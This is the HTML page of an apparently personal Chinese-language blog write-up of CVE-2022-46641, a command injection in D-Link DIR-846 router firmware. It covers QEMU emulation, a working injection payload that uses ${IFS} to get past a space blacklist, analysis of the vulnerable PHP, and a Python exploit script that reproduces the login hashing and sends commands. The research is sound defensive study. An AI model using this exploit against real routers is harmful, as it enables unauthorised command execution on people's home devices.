<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>test</title>
<meta name="keywords" content="">
<meta name="description" content="CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 &#43; qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
![image-20230104143631939](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104143631939.png)
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
![image-20230104150209686](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104150209686.png)
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
![image-20230104151137097](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104151137097.png)
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件">
<meta name="author" content="">
<link rel="canonical" href="http://lexshoukaku.github.io/vuln/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="http://lexshoukaku.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://lexshoukaku.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://lexshoukaku.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://lexshoukaku.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="http://lexshoukaku.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="" />
<meta property="og:description" content="CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 &#43; qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
![image-20230104143631939](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104143631939.png)
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
![image-20230104150209686](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104150209686.png)
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
![image-20230104151137097](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104151137097.png)
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://lexshoukaku.github.io/vuln/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="vuln" />



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 &#43; qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
![image-20230104143631939](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104143631939.png)
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
![image-20230104150209686](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104150209686.png)
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
![image-20230104151137097](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104151137097.png)
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Vulns",
      "item": "http://lexshoukaku.github.io/vuln/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "",
      "item": "http://lexshoukaku.github.io/vuln/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "",
  "name": "",
  "description": "CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹\n![image-20230104143631939](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104143631939.png)\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n![image-20230104150209686](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104150209686.png)\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n![image-20230104151137097](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104151137097.png)\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件",
  "keywords": [
    
  ],
  "articleBody": "CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹\n![image-20230104143631939](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104143631939.png)\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n![image-20230104150209686](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104150209686.png)\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n![image-20230104151137097](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104151137097.png)\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件\n![image-20230104152711152](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104152711152.png)\n然后我们进行访问：\n发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：\n![image-20230104153205878](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104153205878.png)\n根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动\n我们退出qemu，搜索一下php-fastcgi相关的文件：\n![image-20230104153612925](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104153612925.png)\n这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。\n那么现在出现了一个严峻的问题：我们需要使用模拟环境同时启动两个服务，但是qemu的user模式不支持两个模拟环境联动，所以我们需要使用qemu的system模式。\nqemu-system 启动成功 因为需要涉及到两个服务联动，所以我们使用qemu-system模拟一个debian系统。\n首先我们需要为qemu-system搭建一个网桥：\nsudo ifconfig ens33 down # 先停用host的网卡\rsudo brctl addbr br0 # 添加名为br0的网桥\rsudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上\rsudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议\rsudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式\rsudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式\rsudo dhclient br0 # 让网桥从dhcp获取ip\rsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0\rsudo brctl addif br0 tap0 # 将tap0插到网桥\rsudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 查看ifconfig可以看到已经配置成功：\n![image-20230104155156784](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104155156784.png)\n然后，我们需要下载qemu-system模拟debain系统的内核文件和硬盘文件（下载（×），找师兄白嫖（√））：\n![image-20230104155438600](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104155438600.png)\n接下来使用命令开启qemu-system:\nsudo qemu-system-mipsel -M malta -m 512 \\\r-kernel vmlinux-3.2.0-4-4kc-malta-x86 \\\r-hda debian_wheezy_mipsel_standard.qcow2 \\\r-append \"root=/dev/sda1 console=ttyS0\" \\\r-net nic,macaddr=00:19:3e:00:00:01 -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no -kernel：选择内核版本，这里选择lighttpd符合的版本\n-hda：选择硬盘文件\n-nographic：不适用GUI图形界面\n-net nic -net tap,ifname=tap0,script=no,downscript=no：选择桥接模式，使用刚刚我们创建的网卡\n启动成功后，给qemu-system分配ip：\nifconfig eth0 然后使用scp将固件中的linux根目录传进qemu-system（注：这里需要先将固件的根目录打包，再传入qemu-system，否则scp将会破坏掉固件中的软连接）\n随后解压，挂载debian系统的/proc和/dev：\nmount --bind /proc ./proc\rmount --bind /dev ./dev\rchroot . /bin/bash 最后启动服务：\n**注：**在启动过程中会遇到如缺少文件的报错，这种报错缺少什么文件我们就创建什么文件就好了\n./etc/init.d/php7-fastcgi start\r./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf ![image-20230104161305384](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104161305384.png)\n![image-20230104161327014](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104161327014.png)\n漏洞复现 **注：**该漏洞需要登陆获取cookie\n首先我们来到路由器登陆界面开启抓包：\n![image-20230112112931132](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112112931132.png)\n输入密码后看到抓包：\n![image-20230112113035189](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112113035189.png)\n![image-20230112113049780](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112113049780.png)\n这里我们可以看到抓到了两个登陆的包。具体的原因我们后面编写exp时会提到，这里我们先使用第二个登陆包里的cookie\n将这个cookie复制到poc上，就可以执行命令了：\n{\"SetIpMacBindSettings\":{\"lan_unit\":\"0\",\"lan(0)_dhcps_staticlist\":\"1,`touch${IFS}/tmp/yorktown`asdasdasd,12:34:56:78:90:11,192.168.0.9\"}} 这里我修改了命令，原poc的命令是reboot，太大开大合了，相比之下创建一个文件显得十分的低调。符合黑客低调的行事风格（雾）\n复现结果如下\n![image-20230112113914254](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112113914254.png)\n漏洞点代码分析 根据git上的poc我们可以看到，该漏洞是存在于 /www/HNAP1/control/SetIpMacBindSettings.php文件中\n对源码的分析，我们可以看到源码的原本流程大致是对路由器上的mac地址做一个记录和修改。但是因为没有对传入的参数做足够的限制，所以导致了命令注入.\n大概的流程为：\n#SetIpMacBindSettings.php:35\r$staticlist = explode(\";\", $option['lan(0)_dhcps_staticlist']); 这里是读取了poc上带有命令的字段，为了直观感受，我在源码中输出了这个值：\n![image-20230112115202329](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112115202329.png)\n![image-20230112115430290](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112115430290.png)\n随后，进入循环，将值赋给 $val：\n#SetIpMacBindSettings.php:74\rforeach ($staticlist as $val) 接下来，代码会将我们输入的值根据 “,”分割：\n#SetIpMacBindSettings.php:75\r$vl_arr = explode(\",\", $val); 所以我们的命令存放在 $val[1]中，\n最后跟随着另外的命令一起执行：\n#SetIpMacBindSettings.php:80\rexec(\"changename.sh \" . $vl_arr[2] . \" \" . $vl_arr[1]); 当然，在源码中，开发者对输入的字符进行了限制，其目的就是为了防止命令的注入。但是很明显，这种限制是会被攻击者轻松绕过的。\n例如如下代码：\n#SetIpMacBindSettings.php:54\r$special_char_arr = array(\"\\'\", \" \", \"\\\"\");\rif (contains_special_char($vl_arr[1], $special_char_arr)) {\r$result[\"message\"] = \"specil character.\";\r$this-\u003eapi_response(__CLASS__, $result);\r}\r#HNAP1/core/fun/public.php:420\rfunction contains_special_char($str, $special_char_arr)\r{\rfor ($i = 0; $i \u003c count($special_char_arr); $i++) {\rif (strpos($str, $special_char_arr[$i]) !== false) {\rreturn true;\r}\r}\rreturn false;\r} 可以看到上面的代码，首先生成了一个黑名单，然后将黑名单和我们输入的字符放入 contains_special_char函数中，通过观察函数的定义，我们也可以判断这是一个对特殊字符进行检测的函数。\n但是问题恰恰出在这里，因为只检测了空格符号和转义符，但是当我们使用如 ${IFS} \\t等可以代替空格的符号时，就可以绕过检测，从而非法执行命令。\nexp编写 通过上面的漏洞复现，我们可以知道exp需要经历的流程：\n第一次登陆——》第二次登陆——》获取cookie——》发送命令 那么，为什么登陆时会有发送两个包，这两个包有什么关系吗？\n通过在浏览器里的记录（开发者模式中对网络发包的记录），我们可以找到一些线索：\n![image-20230112141419790](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141419790.png)\n这是第一次登陆发送的包头，而返回的包头中多出来了一个Set-Cookie的字段：\n![image-20230112141525369](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141525369.png)\n然后第二次登陆的请求头中，就将这个字段当作了cookie的一部分：\n![image-20230112141709593](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141709593.png)\n同时在cookie中多出来了两个别的字段，而这两个字段则是来自上一个返回包的数据部分：\n![image-20230112141828995](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141828995.png)\n这里可以看到uid是直接把返回包的cookie字段复制过去了，但是privatekey是怎么得到的呢？\n我们只能又去找源码了。\n因为我们是通过login.html点击登陆按钮开始发包的，所以可以从这个文件寻找按钮事件开始寻找：\n#/www/login.html:404\r通过这个onClinck事件，我们可以追朔到 \\www\\Login.html:243\n这里定义了点击登陆按钮之后的流程，这里的具体流程我们可以不用了解，但是我们需要关注一段代码：\n#\\www\\Login.html:244\rvar Login_Password = document.getElementById(\"admin_Password1\").value;\rvar Login_Captcha = \"\";\rdocument.getElementById(\"logIn_btn\").disabled = true;\rdocument.getElementById(\"error_1\").style.display = \"none\";\rdoLogin(Login_Password, Login_Captcha) 这一段代码，就是将我们在网页上输入的密码，传入了一个叫做 doLogin()的函数。\n根据经验，我们可以猜测，这个函数里就是处理密码的地方 根据经验（×），这么大一个login就写在上面（√）\n通过寻找，我们追寻到了 \\www\\js\\Login.js\n在这里我们就可以看到上面privatekey的来历了：\n#\\www\\js\\Login.js:16\rPrivateKey = md5(obj.PublicKey + ifLogin_Password + obj.Challenge);\rPrivateKey = PrivateKey.toUpperCase();\t//将PrivateKey全改为大写 这个 ifLogin_Password 就是咱们传进来的密码\n现在我们知道这个privatekey是怎么来的了。\n但是我们先不要着急，因为在下面，有一个非常重要的东西就是密码的加密过程：\n#\\www\\js\\Login.js:28\r$.cookie('PrivateKey', PrivateKey, {path: '/'});\rvar Login_Passwd = md5(PrivateKey + obj.Challenge);\rLogin_Passwd = Login_Passwd.toUpperCase(); 到这里，整个密码的加密过程就完整了：\n先使用md5加密（PublicKey + Password + Challenge）得到privatekey，然后再使用md5加密（privatekey + Challenge） 所以我们的exp:\n#将所有数据设定好\rurl = \"\"\rcookie = \"\"\rpasswd = '12345678'\rhead = {\r'Host': '192.168.52.128:8080',\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',\r'Accept': 'application/json, text/javascript, */*; q=0.01',\r'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\r'Accept-Encoding': 'gzip, deflate',\r'Content-Type': 'application/json; charset=utf-8',\r'SOAPAction': '\"http://purenetworks.com/HNAP1/Login\"',\r'HNAP_AUTH': 'E5C14446F7156A0DE9E56D8ED83DAA45 1673393304539',\r'X-Requested-With': 'XMLHttpRequest',\r'Content-Length': '128',\r'Origin': 'http://192.168.52.128:8080',\r'Connection': 'close',\r'Referer': 'http://192.168.52.128:8080/Login.html?t=1673247593914',\r}\rdata1 = {\"Login\":{\"Action\":\"request\",\"Username\":\"admin\",\"LoginPassword\":\"\",\"Captcha\":\"\",\"PrivateLogin\":\"LoginPassword\"}}\rdata2 = {\r\"Login\":\r{\r\"Action\":\"login\",\r\"Username\":\"admin\",\r\"LoginPassword\":\"\",\r\"Captcha\":\"\",\r\"PrivateLogin\":\"LoginPassword\"\r}\r}\rdata3 = {\r\"SetIpMacBindSettings\":\r{\r\"lan_unit\":\"0\",\r\"lan(0)_dhcps_staticlist\":\"\"\r}\r} #第一次登陆，返回PHPSESSID, challenge, uid, PublicKey\rdef login_1():\rret = requests.post(url, headers=head, data=json.dumps(data1))\rPHPSESSID = ret.headers['Set-Cookie'][:-8]\rresponse_challenge = ret.text.find(\"Challenge\")\rresponse_cookie = ret.text.find(\"Cookie\")\rresponse_publickey = ret.text.find(\"\\\",\\\"PublicKey\")\rresponse_end = ret.text.find(\"\\\"}}\")\rchallenge = ret.text[response_challenge+12:response_cookie-3]\ruid = ret.text[response_cookie+9:response_publickey]\rPublicKey = ret.text[response_publickey+15:response_end]\r# ex(ret.text, challenge, uid, PublicKey)\rif not PHPSESSID:\rex(\"PHPSESSID empty\")\rif not challenge:\rex(\"challenge empty\")\rif not uid:\rex(\"uid empty\")\rif not PublicKey:\rex(\"PublicKey empty\")\rreturn PHPSESSID, challenge, uid, PublicKey #将cookie拼接好，并且对密码进行加密\rcookie += PHPSESSID + ';uid=' + uid + ';privetakey=' +privetakey\rlogin_passwd, privetakey = MD5(PublicKey, passwd, challenge)\rdef MD5(public :str, passwd :str, challenge :str):\rh1 = hashlib.md5()\rh2 = hashlib.md5()\rh1.update((public + passwd + challenge).encode())\rprivatekey = h1.hexdigest()\r# ex(privatekey.upper())\rh2.update((privatekey.upper() + challenge).encode())\rreturn h2.hexdigest(), privatekey.upper() #然后进行第二次登陆\rdef login_2(cookie, loginpassword):\rdata2['Login']['LoginPassword'] = loginpassword\rhead['Cookie'] = cookie\rret = requests.post(url, headers=head, data=json.dumps(data2)) #第二次发包后，该cookie就可以进行命令注入了，故构造命令注入的数据包\rdef login_3(cmd):\rdata3[\"SetIpMacBindSettings\"]['lan(0)_dhcps_staticlist'] = cmd\rret = requests.post(url, headers=head, data=json.dumps(data3))\r# ex(ret.text)\rif \"OK\" not in ret.text:\rex(\"vuln use false\") ",
  "wordCount" : "671",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://lexshoukaku.github.io/vuln/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "test",
    "logo": {
      "@type": "ImageObject",
      "url": "http://lexshoukaku.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://lexshoukaku.github.io" accesskey="h" title="test (Alt + H)">test</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      
    </h1>
    <div class="post-meta">

</div>
  </header> 
  <div class="post-content"><h2 id="cve-2022-46641-d-link-dir-846命令注入漏洞">CVE-2022-46641 D-Link dir-846命令注入漏洞<a hidden class="anchor" aria-hidden="true" href="#cve-2022-46641-d-link-dir-846命令注入漏洞">#</a></h2>
<h3 id="漏洞信息">漏洞信息<a hidden class="anchor" aria-hidden="true" href="#漏洞信息">#</a></h3>
<p>D-Link dir-846路由，是D-Link生产的小型家用路由器。</p>
<p>该漏洞是对用户输入的字符串检测不够严格造成的。</p>
<p>固件版本：A1_FW100A43</p>
<p>影响范围：<strong>dlink:dir-846_firmware:100a43</strong></p>
<p>测试环境：Ubuntu20 + qemu模拟debian</p>
<h3 id="环境模拟">环境模拟<a hidden class="anchor" aria-hidden="true" href="#环境模拟">#</a></h3>
<p>在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](<a href="https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link">https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link</a> dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43</p>
<p>我们可以直接在[官网](<a href="http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-846">D-Link Technical Support (dlink.com.cn)</a>)进行下载</p>
<p>下载下来后使用binwalk解压：</p>
<pre tabindex="0"><code>binwalk -Me1 DIR846A1_FW100A43.bin
</code></pre><p>便可以得到一个类似linux系统根目录的文件夹</p>
<p>![image-20230104143631939](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104143631939.png)</p>
<p>这里我们先找到我们需要启动的服务路径和名称。</p>
<p>根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：</p>
<p>![image-20230104150209686](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104150209686.png)</p>
<p>可以看到在 <code>/usr/sbin</code>目录下有一个lighttpd文件，那么我们可以试一试这个文件：</p>
<p>首先看一看目标文件的架构：</p>
<p>![image-20230104151137097](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104151137097.png)</p>
<p>可以看到是32位mips的小段</p>
<h4 id="qemu-user-启动失败">qemu-user 启动失败<a hidden class="anchor" aria-hidden="true" href="#qemu-user-启动失败">#</a></h4>
<p>这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：</p>
<pre tabindex="0"><code>sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf
</code></pre><blockquote>
<p><code>-L .</code>：类似于chroot .</p>
<p><code>-D</code>：显示报错信息</p>
<p><code>-f</code> ：指定配置文件</p>
</blockquote>
<p>![image-20230104152711152](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104152711152.png)</p>
<p>然后我们进行访问：</p>
<p>发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：</p>
